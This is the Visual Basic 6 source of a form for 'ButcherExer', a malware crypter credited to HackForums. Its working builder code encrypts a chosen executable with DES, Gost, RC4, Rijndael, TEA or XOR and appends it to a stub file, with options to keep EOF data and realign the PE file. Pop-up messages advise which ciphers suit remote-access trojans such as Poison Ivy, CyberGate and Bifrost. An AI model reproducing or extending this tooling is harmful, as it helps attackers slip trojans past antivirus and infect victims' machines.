VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "ButcherExer - Public Edition v 1.1"
   ClientHeight    =   6975
   ClientLeft      =   3465
   ClientTop       =   1695
   ClientWidth     =   6375
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   11.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6975
   ScaleWidth      =   6375
   Begin MSComDlg.CommonDialog CD 
      Left            =   7305
      Top             =   7170
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FFFFFF&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   7125
      Left            =   0
      TabIndex        =   0
      Top             =   -120
      Width           =   6540
      Begin VB.PictureBox Picture 
         Height          =   2475
         Left            =   135
         Picture         =   "Form1.frx":27A2
         ScaleHeight     =   2415
         ScaleWidth      =   5850
         TabIndex        =   24
         Top             =   3360
         Width           =   5910
      End
      Begin ButcherCrypter.XP_ProgressBar XP_ProgressBar1 
         Height          =   330
         Left            =   75
         TabIndex        =   21
         Top             =   5880
         Width           =   5925
         _ExtentX        =   10451
         _ExtentY        =   582
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BrushStyle      =   0
         Color           =   16711680
         Scrolling       =   1
      End
      Begin VB.Frame Frame5 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Encryptions"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1320
         Left            =   2595
         TabIndex        =   14
         Top             =   2025
         Width           =   1920
         Begin VB.OptionButton Option6 
            BackColor       =   &H00FFFFFF&
            Caption         =   "XOR"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   990
            TabIndex        =   20
            Top             =   930
            Width           =   735
         End
         Begin VB.OptionButton Option5 
            BackColor       =   &H00FFFFFF&
            Caption         =   "TEA"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1005
            TabIndex        =   19
            Top             =   585
            Width           =   735
         End
         Begin VB.OptionButton Option4 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Rij"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1020
            TabIndex        =   18
            Top             =   240
            Width           =   975
         End
         Begin VB.OptionButton Option3 
            BackColor       =   &H00FFFFFF&
            Caption         =   "RC4"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   75
            TabIndex        =   17
            Top             =   285
            Width           =   735
         End
         Begin VB.OptionButton Option2 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Gost"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   75
            TabIndex        =   16
            Top             =   930
            Width           =   735
         End
         Begin VB.OptionButton Option1 
            BackColor       =   &H00FFFFFF&
            Caption         =   "DES"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   75
            TabIndex        =   15
            Top             =   600
            Value           =   -1  'True
            Width           =   735
         End
      End
      Begin VB.Frame Frame3 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1305
         Left            =   120
         TabIndex        =   2
         Top             =   2040
         Width           =   2415
         Begin VB.CheckBox chkPE 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Re-AlignPE"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1200
            TabIndex        =   13
            Top             =   480
            Width           =   1095
         End
         Begin VB.CheckBox chkEOF 
            BackColor       =   &H00FFFFFF&
            Caption         =   "EOF Data"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   105
            TabIndex        =   12
            Top             =   495
            Width           =   1095
         End
      End
      Begin VB.Frame Frame2 
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1815
         Left            =   120
         TabIndex        =   1
         Top             =   210
         Width           =   6330
         Begin ButcherCrypter.Button cmdBuscar 
            Height          =   420
            Left            =   4650
            TabIndex        =   9
            Top             =   225
            Width           =   1500
            _ExtentX        =   2646
            _ExtentY        =   741
            ButtonStyle     =   8
            ButtonTheme     =   5
            PictureAlignment=   1
            BackColor       =   181749
            BackColorPressed=   11530238
            BackColorHover  =   14875135
            BorderColor     =   181749
            BorderColorPressed=   11530238
            BorderColorHover=   14875135
            Caption         =   "     Browse"
            Picture         =   "Form1.frx":641A
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Impact"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.TextBox Text3 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Impact"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   360
            Left            =   1080
            TabIndex        =   8
            Top             =   1200
            Width           =   3540
         End
         Begin VB.TextBox Text2 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Impact"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   360
            Left            =   1080
            TabIndex        =   7
            Top             =   720
            Width           =   3540
         End
         Begin VB.TextBox Text1 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Impact"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   405
            Left            =   1080
            TabIndex        =   6
            Top             =   240
            Width           =   3555
         End
         Begin ButcherCrypter.Button cmdStub 
            Height          =   375
            Left            =   4650
            TabIndex        =   10
            Top             =   720
            Width           =   1500
            _ExtentX        =   2646
            _ExtentY        =   661
            ButtonStyle     =   8
            ButtonTheme     =   5
            PictureAlignment=   1
            BackColor       =   181749
            BackColorPressed=   11530238
            BackColorHover  =   14875135
            BorderColor     =   181749
            BorderColorPressed=   11530238
            BorderColorHover=   14875135
            Caption         =   "     Browse"
            Picture         =   "Form1.frx":8BCC
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Impact"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin ButcherCrypter.Button cmdGenerar 
            Height          =   405
            Left            =   4665
            TabIndex        =   11
            Top             =   1170
            Width           =   1500
            _ExtentX        =   2646
            _ExtentY        =   714
            ButtonStyle     =   8
            ButtonTheme     =   5
            PictureAlignment=   1
            BackColor       =   181749
            BackColorPressed=   11530238
            BackColorHover  =   14875135
            BorderColor     =   181749
            BorderColorPressed=   11530238
            BorderColorHover=   14875135
            Caption         =   "   Gen"
            Picture         =   "Form1.frx":B37E
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Impact"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.Label Label3 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Key>>>"
            BeginProperty Font 
               Name            =   "Impact"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   165
            TabIndex        =   5
            Top             =   1305
            Width           =   765
         End
         Begin VB.Label Label2 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Stub>>>"
            BeginProperty Font 
               Name            =   "Impact"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   105
            TabIndex        =   4
            Top             =   825
            Width           =   840
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   "Exe >>>"
            BeginProperty Font 
               Name            =   "Impact"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   300
            Left            =   210
            TabIndex        =   3
            Top             =   345
            Width           =   765
         End
      End
      Begin ButcherCrypter.Button cmdCrear 
         Height          =   390
         Left            =   75
         TabIndex        =   22
         Top             =   6270
         Width           =   5955
         _ExtentX        =   10504
         _ExtentY        =   688
         ButtonStyle     =   8
         ButtonTheme     =   5
         BackColor       =   181749
         BackColorPressed=   11530238
         BackColorHover  =   14875135
         BorderColor     =   181749
         BorderColorPressed=   11530238
         BorderColorHover=   14875135
         Caption         =   "Crypt"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin ButcherCrypter.Button Button3 
         Height          =   300
         Left            =   90
         TabIndex        =   23
         Top             =   6705
         Width           =   5940
         _ExtentX        =   10478
         _ExtentY        =   529
         ButtonStyle     =   8
         ButtonTheme     =   5
         BackColor       =   181749
         BackColorPressed=   11530238
         BackColorHover  =   14875135
         BorderColor     =   181749
         BorderColorPressed=   11530238
         BorderColorHover=   14875135
         Caption         =   "Credits"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Impact"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit



Private Sub Button3_Click()
    MsgBox "Coded by Edward Butcher" & vbNewLine & _
        "Version: 1.0" & vbNewLine & _
        "Language: Visual Basic 6" & vbNewLine & _
        "www.HackForums.net", vbInformation, "AboutMe"
End Sub

Private Sub cmdBuscar_Click()
'--------------------------------------------------------------------------------------
'//-> BUSCAR ARCHIVO
'--------------------------------------------------------------------------------------

    With CD
        .DialogTitle = "Select archive!"
        .Filter = "Executable archive EXE|*.exe"
        .flags = cdlOFNFileMustExist
        .ShowOpen
    End With
    
    If CD.Filename <> vbNullString Then

        Text1.Text = CD.Filename
        
    End If
    
    CD.Filename = vbNullString
    'Preguntale pues ¬¬
End Sub

Private Sub cmdCrear_Click()
'--------------------------------------------------------------------------------------
'//-> ENCRIPTAR
'--------------------------------------------------------------------------------------
    
    Dim Free    As Long
    Dim Stub    As String
    Dim EOF     As String
    Dim Data    As String
    Dim hRC4    As New clsRC4
    Dim hXOR    As New clsXOR
    Dim hTEA    As New clsTEA
    Dim hDES    As New clsDES
    Dim hGost   As New clsGost
    Dim hRIJ    As New clsRijndael
    Dim Final   As String
    Dim i       As Long
    Dim Bytes   As String
    Dim Enc     As Integer
    
    Free = FreeFile
    
    With CD
        .DialogTitle = "Select Archive"
        .Filter = "Executable archive EXE|*.exe"
        .ShowSave
    End With
    
    If CD.Filename <> vbNullString Then
    
        Open Text2.Text For Binary As Free
            Stub = Space$(LOF(1))
            Get #1, , Stub
        Close Free
        
        XP_ProgressBar1.Value = 10
        
        XP_ProgressBar1.Value = 20
        
        XP_ProgressBar1.Value = 30
        
        
        
        '//-> ReadEOFData
        If chkEOF.Value = 1 Then EOF = ReadEOFData(Text1.Text)
        
        XP_ProgressBar1.Value = 20
        
        Open Text1.Text For Binary As Free
            Data = Space$(LOF(1))
            Get #1, , Data
        Close Free
        
        XP_ProgressBar1.Value = 40
        
        XP_ProgressBar1.Value = 50
        
        
        If Option1.Value = True Then Data = hDES.EncryptString(Data, Text3.Text): Enc = 1
        If Option2.Value = True Then Data = hGost.EncryptString(Data, Text3.Text): Enc = 2
        If Option3.Value = True Then Data = hRC4.EncryptString(Data, Text3.Text): Enc = 3
        If Option4.Value = True Then Data = hRIJ.EncryptString(Data, Text3.Text): Enc = 4
        If Option5.Value = True Then Data = hTEA.EncryptString(Data, Text3.Text): Enc = 5
        If Option6.Value = True Then Data = hXOR.EncryptString(Data, Text3.Text): Enc = 6
        
        XP_ProgressBar1.Value = 60
        
        
        XP_ProgressBar1.Value = 70
        
        Final = Data & "[Butcher]" & "[Butcher]" & Text3.Text & "[Butcher]" & Enc
        
        XP_ProgressBar1.Value = 80
        
        Open CD.Filename For Binary As Free
            Put #1, , Stub & "[Butcher]"
            Put #1, , Final
        Close #1
        
        XP_ProgressBar1.Value = 85
        
    
                Open CD.Filename For Append As #1
                    
                    Print #1, LOF(1), " "
                    
                Close #1
            
            
        End If
        XP_ProgressBar1.Value = 90
        
        XP_ProgressBar1.Value = 95
        
        If chkEOF.Value = 1 Then Call WriteEOFData(CD.Filename, EOF)
        
        '//-> Re-Align PE
        If chkPE.Value = 1 Then Call RealignPEFromFile(CD.Filename)
        
        XP_ProgressBar1.Value = 100
        
        MsgBox "ButcherExer is done with crypting!", vbInformation, "Crypted!"
        
        XP_ProgressBar1.Value = 0
        
    
    
    
End Sub

Private Sub cmdGenerar_Click()
'--------------------------------------------------------------------------------------
'//-> KEY
'--------------------------------------------------------------------------------------

    Text3.Text = Aleatorio(50)

End Sub

Private Sub cmdStub_Click()
'--------------------------------------------------------------------------------------
'//-> BUSCAR STUB
'--------------------------------------------------------------------------------------

    With CD
        .DialogTitle = "Select archive!"
        .Filter = "Executable archive EXE|*.exe|Library DLL|*.dll"
        .flags = cdlOFNFileMustExist
        .ShowOpen
    End With
    
    If CD.Filename <> vbNullString Then
    
        Text2.Text = CD.Filename
        
    End If
    
    CD.Filename = vbNullString

End Sub

Function Aleatorio(Tamaño As String) As String ' // By Karcrack
'--------------------------------------------------------------------------------------
'//-> GENERADOR DE PASSWORDS
'--------------------------------------------------------------------------------------

    Dim i
    
    For i = 1 To Tamaño
        Randomize
        Aleatorio = Aleatorio & Chr$(CLng((5 - 90) * Rnd + 90))
    Next i
    
End Function



Private Sub Option3_Click()
MsgBox "This Encryption works well with SpyNet/CyberGate/Cerebrus/Poison Ivy/Bifrost", vbInformation, "RC4 Encryption"
End Sub

Private Sub Option4_Click()
MsgBox "This Encryption may corrupt SpyNet/Cerebrus/CyberGate servers, you have been warned!", vbInformation, "Rijandel Encryption"
End Sub

Private Sub Option6_Click()
MsgBox "This encryptions works well with SpyNet/Poison Ivy/Bifrost", vbInformation, "XOR"
End Sub

